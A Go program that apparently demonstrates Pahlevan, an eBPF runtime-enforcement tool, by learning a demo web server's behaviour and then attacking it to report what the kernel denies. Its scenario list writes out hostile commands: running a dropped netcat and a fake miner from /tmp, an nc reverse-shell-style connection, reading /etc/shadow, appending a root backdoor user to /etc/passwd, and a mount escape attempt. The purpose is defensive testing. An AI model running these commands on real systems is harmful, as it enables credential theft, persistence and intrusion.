// Command scenario runs a real web application under Pahlevan's data plane and
// then attacks it, so that "what does Pahlevan actually do" has an answer made
// of kernel behavior rather than of claims.
//
// It is not a test. A test asserts a property; this reports an outcome, in the
// shape an operator evaluating the tool would want to see: here is a workload,
// here is what it was observed doing, here is what happened when something it
// had never done was attempted.
//
// The whole run happens inside one cgroup, which is the unit Pahlevan governs.
// In a cluster the cgroup comes from the container runtime and the mode flip
// comes from the learning window elapsing; here both are done directly, because
// the point is to exercise the data plane, not the Kubernetes plumbing above it.
//
// Must be run as root on a kernel with the BPF LSM active. That means the VM,
// never a developer's host.
package main

import (
	"context"
	"flag"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/obsernetics/pahlevan/pkg/ebpf"
)

func main() {
	var (
		learn    = flag.Duration("learn", 45*time.Minute, "how long the workload runs before enforcement")
		settle   = flag.Duration("settle", 10*time.Second, "pause between enforcement and the first scenario")
		out      = flag.String("out", "pahlevan-scenario-report.md", "where to write the report")
		appPort  = flag.Int("port", 8080, "port the demo web application listens on")
		trafficN = flag.Duration("traffic-interval", 2*time.Second, "how often the client hits the app")
	)
	flag.Parse()

	if os.Geteuid() != 0 {
		fatal("must run as root: loading and attaching BPF LSM programs needs privilege")
	}

	r := &run{
		started: time.Now(),
		learn:   *learn,
		port:    *appPort,
	}

	mgr, err := ebpf.NewManager()
	if err != nil {
		fatal("initializing the eBPF manager: %v", err)
	}
	defer mgr.Close()
	if err := mgr.LoadPrograms(); err != nil {
		fatal("loading eBPF programs: %v", err)
	}

	obs := &observer{}
	mgr.AddEventHandler(obs)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	if err := mgr.Start(ctx); err != nil {
		fatal("attaching the data plane: %v", err)
	}
	say("data plane attached")

	cgPath, cgID, err := makeCgroup("pahlevan-demo")
	if err != nil {
		fatal("creating the demo cgroup: %v", err)
	}
	defer func() { _ = os.Remove(cgPath) }()
	r.cgroupID = cgID
	say("demo cgroup %s (id %d)", cgPath, cgID)

	// The workload. A static file server is not a toy here: it reads files,
	// binds a port, accepts connections and forks nothing, which is exactly the
	// behavioral profile of the web tier Pahlevan is usually pointed at.
	app, err := startApp(cgPath, *appPort)
	if err != nil {
		fatal("starting the demo application: %v", err)
	}
	defer func() { _ = app.Process.Kill() }()
	say("web application running on :%d inside the demo cgroup", *appPort)

	// Traffic, so the learned baseline reflects a workload under load rather
	// than one that started and sat idle.
	stopTraffic := make(chan struct{})
	var trafficWG sync.WaitGroup
	trafficWG.Add(1)
	go func() { defer trafficWG.Done(); driveTraffic(*appPort, *trafficN, stopTraffic, r) }()

	say("LEARNING for %s - every syscall, file, connection, exec and capability "+
		"the workload uses is being recorded", *learn)
	deadline := time.Now().Add(*learn)
	for time.Now().Before(deadline) {
		time.Sleep(30 * time.Second)
		if time.Now().After(deadline) {
			break
		}
		say("  learning: %s elapsed, %d events observed (%s remaining)",
			time.Since(r.started).Round(time.Second), obs.total(),
			time.Until(deadline).Round(time.Second))
	}

	r.baseline = obs.snapshot()
	say("learning complete: %d events, %d distinct binaries, %d files, %d destinations, %d capabilities",
		r.baseline.Events, len(r.baseline.Execs), len(r.baseline.Files),
		len(r.baseline.Dests), len(r.baseline.Caps))

	// Enforce. From here anything absent from the learned set is refused by the
	// kernel, before it happens.
	for name, set := range map[string]func(uint64, bool) error{
		"file":       mgr.SetFileEnforcement,
		"network":    mgr.SetNetworkEnforcement,
		"exec":       mgr.SetExecEnforcement,
		"capability": mgr.SetCapabilityEnforcement,
	} {
		if err := set(cgID, true); err != nil {
			say("  warning: could not enforce %s: %v", name, err)
			r.enforceWarnings = append(r.enforceWarnings, fmt.Sprintf("%s: %v", name, err))
		}
	}
	say("ENFORCING")
	time.Sleep(*settle)

	// A process filter, so the run also shows the constraint that is about who
	// is running something rather than what is being run.
	if err := mgr.SetProcFilter(cgID, &ebpf.ProcFilter{ParentProcesses: []string{"sh"}}); err != nil {
		say("  warning: could not install the process filter: %v", err)
	}

	r.scenarios = runScenarios(cgPath, *appPort, obs)

	close(stopTraffic)
	trafficWG.Wait()
	r.after = obs.snapshot()
	r.finished = time.Now()

	report := r.render()
	if err := os.WriteFile(*out, []byte(report), 0o600); err != nil {
		fatal("writing the report: %v", err)
	}
	say("report written to %s", *out)
	fmt.Print("\n" + report)
}

// --- the workload -----------------------------------------------------------

// startApp launches the demo web application inside the cgroup.
//
// The shell wrapper is how the process joins the cgroup before exec'ing: there
// is no way to ask exec.Command to place the child in a cgroup, and moving it
// afterwards would mean the exec itself was never observed.
func startApp(cgPath string, port int) (*exec.Cmd, error) {
	root, err := os.MkdirTemp("", "pahlevan-webroot")
	if err != nil {
		return nil, err
	}
	pages := map[string]string{
		"index.html":  "<h1>demo</h1>",
		"health":      "ok",
		"config.json": `{"env":"demo"}`,
	}
	for name, body := range pages {
		if err := os.WriteFile(filepath.Join(root, name), []byte(body), 0o600); err != nil {
			return nil, err
		}
	}
	script := fmt.Sprintf("echo $$ > %s/cgroup.procs && exec python3 -m http.server %d --directory %s",
		cgPath, port, root)
	cmd := exec.Command("/bin/sh", "-c", script)
	cmd.Stdout, cmd.Stderr = nil, nil
	if err := cmd.Start(); err != nil {
		return nil, err
	}
	// Wait for the listener rather than sleeping a guessed interval.
	for i := 0; i < 100; i++ {
		c, err := net.DialTimeout("tcp", fmt.Sprintf("127.0.0.1:%d", port), 200*time.Millisecond)
		if err == nil {
			_ = c.Close()
			return cmd, nil
		}
		time.Sleep(100 * time.Millisecond)
	}
	return nil, fmt.Errorf("the application never began listening on :%d", port)
}

func driveTraffic(port int, every time.Duration, stop <-chan struct{}, r *run) {
	client := &http.Client{Timeout: 3 * time.Second}
	paths := []string{"/", "/health", "/config.json", "/index.html"}
	t := time.NewTicker(every)
	defer t.Stop()
	i := 0
	for {
		select {
		case <-stop:
			return
		case <-t.C:
			url := fmt.Sprintf("http://127.0.0.1:%d%s", port, paths[i%len(paths)])
			i++
			resp, err := client.Get(url) //nolint:noctx // the client's own timeout bounds this
			if err != nil {
				r.mu.Lock()
				r.requestErrors++
				r.mu.Unlock()
				continue
			}
			_ = resp.Body.Close()
			r.mu.Lock()
			r.requests++
			r.mu.Unlock()
		}
	}
}

// --- scenarios ---------------------------------------------------------------

// scenario is one thing an attacker (or a mistake) might do, and what happened.
type scenario struct {
	Name    string
	Story   string
	Command string
	// Expect is what should happen if enforcement is working.
	Expect  string
	Allowed bool
	Detail  string
}

// runScenarios performs each attack against the enforcing workload.
//
// Every one is a real execve, connect or open inside the governed cgroup. None
// of them consult Pahlevan's own state to decide the outcome: the result is
// whatever the kernel did.
func runScenarios(cgPath string, port int, obs *observer) []scenario {
	inCgroup := func(shell string) (string, error) {
		script := fmt.Sprintf("echo $$ > %s/cgroup.procs && %s", cgPath, shell)
		outB, err := exec.Command("/bin/sh", "-c", script).CombinedOutput()
		text := strings.TrimSpace(string(outB))
		if len(text) > 200 {
			text = text[:200] + "..."
		}
		if err != nil {
			return text, err
		}
		return text, nil
	}

	// A dropped binary, staged outside the cgroup so the copy itself is not what
	// gets refused - the question is whether the workload can run it.
	_ = exec.Command("/bin/cp", "/bin/nc", "/tmp/pahlevan-dropped").Run()
	defer func() { _ = os.Remove("/tmp/pahlevan-dropped") }()
	_ = exec.Command("/bin/cp", "/bin/true", "/tmp/xmrig").Run()
	defer func() { _ = os.Remove("/tmp/xmrig") }()

	cases := []struct {
		name, story, cmd, expect string
	}{
		{
			"Legitimate request still served",
			"The control. Enforcement that also breaks the workload is not a win, " +
				"so the first thing to establish is that the application still works.",
			fmt.Sprintf("curl -s -o /dev/null -w '%%{http_code}' http://127.0.0.1:%d/health", port),
			"allowed",
		},
		{
			"Webshell drops and runs a binary",
			"The classic post-exploitation first move: write a tool into /tmp and " +
				"execute it. The binary is real and executable; it has simply never " +
				"been run by this workload.",
			"/tmp/pahlevan-dropped -h",
			"denied",
		},
		{
			"Cryptominer launched under a plausible name",
			"Naming the binary something innocuous changes nothing: the allow-set " +
				"keys on the resolved path, not on a signature or a name list, so " +
				"there is no name that makes an unlearned binary permitted.",
			"/tmp/xmrig",
			"denied",
		},
		{
			"Reverse shell to an external address",
			"Egress the workload has never made. A static file server talks to " +
				"nobody, so every outbound connection is new.",
			"timeout 3 /bin/nc -w 2 203.0.113.7 4444 </dev/null",
			"denied",
		},
		{
			"Credential theft: read /etc/shadow",
			"A file the application never opened during the learning window.",
			"cat /etc/shadow",
			"denied",
		},
		{
			"Persistence: append a user to /etc/passwd",
			"The write path specifically. A workload that read /etc/passwd at " +
				"startup does not thereby get to write it - reads and writes are " +
				"separate entries in the allow-set.",
			"echo 'backdoor:x:0:0::/root:/bin/sh' >> /etc/passwd",
			"denied",
		},
		{
			"Container escape attempt: mount",
			"Requires CAP_SYS_ADMIN, which the workload has never exercised.",
			"mount -t proc proc /mnt 2>&1",
			"denied",
		},
		{
			"Shell spawned by the web server",
			"What a command-injection bug produces. The interpreter itself is " +
				"often already present and already learned, which is why the process " +
				"filter matters: it constrains who may launch it.",
			"/bin/busybox sh -c 'id'",
			"denied",
		},
		{
			"Learned behavior after all the denials",
			"Enforcement must not degrade. After eight refusals the application " +
				"is asked to serve one more request.",
			fmt.Sprintf("curl -s -o /dev/null -w '%%{http_code}' http://127.0.0.1:%d/", port),
			"allowed",
		},
	}

	var out []scenario
	for _, c := range cases {
		before := obs.denials()
		detail, err := inCgroup(c.cmd)
		time.Sleep(300 * time.Millisecond) // let the ring buffer drain
		newDenials := obs.denials() - before

		s := scenario{
			Name: c.name, Story: c.story, Command: c.cmd,
			Expect: c.expect, Allowed: err == nil,
		}
		switch {
		case err != nil && detail != "":
			s.Detail = fmt.Sprintf("%v: %s", err, detail)
		case err != nil:
			s.Detail = err.Error()
		default:
			s.Detail = detail
		}
		if newDenials > 0 {
			s.Detail += fmt.Sprintf(" [%d in-kernel denial(s) recorded]", newDenials)
		}
		out = append(out, s)

		status := "ALLOWED"
		if !s.Allowed {
			status = "DENIED "
		}
		say("  %s  %s", status, c.name)
	}
	return out
}

// --- observation --------------------------------------------------------------

type snapshot struct {
	Events  int
	Denials int
	Execs   []string
	Files   []string
	Dests   []string
	Caps    []string
	Denied  []string
}

// observer is the event handler the manager dispatches into. It is the same
// interface the agent's learner and export pipeline implement.
type observer struct {
	mu       sync.Mutex
	events   int
	denied   int
	execs    map[string]int
	files    map[string]int
	dests    map[string]int
	caps     map[string]int
	denials_ []string
}

func (o *observer) init() {
	if o.execs == nil {
		o.execs = map[string]int{}
		o.files = map[string]int{}
		o.dests = map[string]int{}
		o.caps = map[string]int{}
	}
}

func (o *observer) HandleSyscallEvent(*ebpf.SyscallEvent) error {
	o.mu.Lock()
	defer o.mu.Unlock()
	o.events++
	return nil
}

func (o *observer) HandleProcessEvent(e *ebpf.ProcessEvent) error {
	o.mu.Lock()
	defer o.mu.Unlock()
	o.init()
	o.events++
	if e.IsExit() {
		return nil
	}
	o.execs[e.Filename]++
	if e.IsDenied() {
		o.denied++
		o.denials_ = append(o.denials_, fmt.Sprintf(
			"exec %s (%s), lineage %s", e.Filename, e.DenialReason(), e.AncestryChain()))
	}
	return nil
}

func (o *observer) HandleFileEvent(e *ebpf.FileEvent) error {
	o.mu.Lock()
	defer o.mu.Unlock()
	o.init()
	o.events++
	mode := "read"
	if e.IsWrite() {
		mode = "write"
	}
	o.files[mode+" "+e.Path]++
	if e.IsDenied() {
		o.denied++
		o.denials_ = append(o.denials_, fmt.Sprintf("file %s %s by %s", mode, e.Path, e.Comm))
	}
	return nil
}

func (o *observer) HandleNetworkEvent(e *ebpf.NetworkEvent) error {
	o.mu.Lock()
	defer o.mu.Unlock()
	o.init()
	o.events++
	dest := fmt.Sprintf("%s:%d", ebpf.IPv4String(e.DstIP), e.DstPort)
	o.dests[dest]++
	if e.Direction&ebpf.DeniedDirection != 0 {
		o.denied++
		o.denials_ = append(o.denials_, fmt.Sprintf("connect %s by %s", dest, e.Comm))
	}
	return nil
}

func (o *observer) HandleCapabilityEvent(e *ebpf.CapabilityEvent) error {
	o.mu.Lock()
	defer o.mu.Unlock()
	o.init()
	o.events++
	name := ebpf.CapabilityName(e.Capability)
	o.caps[name]++
	if e.Flags&ebpf.DeniedFlag != 0 {
		o.denied++
		o.denials_ = append(o.denials_, fmt.Sprintf("capability %s by %s", name, e.Comm))
	}
	return nil
}

func (o *observer) total() int {
	o.mu.Lock()
	defer o.mu.Unlock()
	return o.events
}

func (o *observer) denials() int {
	o.mu.Lock()
	defer o.mu.Unlock()
	return o.denied
}

func (o *observer) snapshot() snapshot {
	o.mu.Lock()
	defer o.mu.Unlock()
	o.init()
	keys := func(m map[string]int) []string {
		out := make([]string, 0, len(m))
		for k := range m {
			out = append(out, k)
		}
		sort.Strings(out)
		return out
	}
	return snapshot{
		Events: o.events, Denials: o.denied,
		Execs: keys(o.execs), Files: keys(o.files),
		Dests: keys(o.dests), Caps: keys(o.caps),
		Denied: append([]string(nil), o.denials_...),
	}
}

// --- reporting -----------------------------------------------------------------

type run struct {
	mu              sync.Mutex
	started         time.Time
	finished        time.Time
	learn           time.Duration
	port            int
	cgroupID        uint64
	requests        int
	requestErrors   int
	baseline        snapshot
	after           snapshot
	scenarios       []scenario
	enforceWarnings []string
}

func (r *run) render() string {
	var b strings.Builder
	p := func(f string, a ...any) { fmt.Fprintf(&b, f+"\n", a...) }

	p("# Pahlevan on a live web application")
	p("")
	p("A static file server ran for %s under continuous traffic while Pahlevan",
		r.learn.Round(time.Second))
	p("observed it. Enforcement was then switched on and the workload was attacked.")
	p("Nothing below is asserted: each line is what the kernel did.")
	p("")
	p("| | |")
	p("|---|---|")
	p("| Started | %s |", r.started.UTC().Format(time.RFC3339))
	p("| Finished | %s |", r.finished.UTC().Format(time.RFC3339))
	p("| Total run | %s |", r.finished.Sub(r.started).Round(time.Second))
	p("| Learning window | %s |", r.learn.Round(time.Second))
	p("| Cgroup | %d |", r.cgroupID)
	p("| Requests served | %d (%d failed) |", r.requests, r.requestErrors)
	p("| Events observed | %d |", r.after.Events)
	p("")
	if len(r.enforceWarnings) > 0 {
		p("> Enforcement could not be enabled for: %s", strings.Join(r.enforceWarnings, "; "))
		p("")
	}

	p("## What it learned")
	p("")
	p("This is the whole policy. Nobody wrote it.")
	p("")
	p("**Binaries executed (%d)**", len(r.baseline.Execs))
	p("")
	for _, e := range r.baseline.Execs {
		p("- `%s`", e)
	}
	p("")
	p("**Files touched (%d)**", len(r.baseline.Files))
	p("")
	for _, f := range limit(r.baseline.Files, 25) {
		p("- `%s`", f)
	}
	p("")
	p("**Network destinations (%d)**", len(r.baseline.Dests))
	p("")
	for _, d := range r.baseline.Dests {
		p("- `%s`", d)
	}
	p("")
	p("**Capabilities used (%d)**", len(r.baseline.Caps))
	p("")
	for _, c := range r.baseline.Caps {
		p("- `%s`", c)
	}
	p("")

	p("## What happened when it was attacked")
	p("")
	p("| Scenario | Expected | Result |")
	p("|---|---|---|")
	for _, s := range r.scenarios {
		got := "denied"
		if s.Allowed {
			got = "allowed"
		}
		mark := "MATCH"
		if got != s.Expect {
			mark = "**MISMATCH**"
		}
		p("| %s | %s | %s (%s) |", s.Name, s.Expect, got, mark)
	}
	p("")
	for _, s := range r.scenarios {
		p("### %s", s.Name)
		p("")
		p("%s", s.Story)
		p("")
		p("```")
		p("$ %s", s.Command)
		p("%s", s.Detail)
		p("```")
		p("")
	}

	p("## In-kernel denials recorded")
	p("")
	if len(r.after.Denied) == 0 {
		p("None.")
	}
	for _, d := range r.after.Denied {
		p("- %s", d)
	}
	p("")
	return b.String()
}

func limit(s []string, n int) []string {
	if len(s) <= n {
		return s
	}
	out := append([]string(nil), s[:n]...)
	return append(out, fmt.Sprintf("... and %d more", len(s)-n))
}

// --- plumbing -------------------------------------------------------------------

func makeCgroup(name string) (string, uint64, error) {
	path := filepath.Join("/sys/fs/cgroup", name)
	if err := os.Mkdir(path, 0o755); err != nil && !os.IsExist(err) {
		return "", 0, err
	}
	var st syscall.Stat_t
	if err := syscall.Stat(path, &st); err != nil {
		return "", 0, err
	}
	return path, st.Ino, nil
}

func say(f string, a ...any) {
	fmt.Printf("[%s] %s\n", time.Now().Format("15:04:05"), fmt.Sprintf(f, a...))
}

func fatal(f string, a ...any) {
	fmt.Fprintf(os.Stderr, "scenario: %s\n", fmt.Sprintf(f, a...))
	os.Exit(1)
}
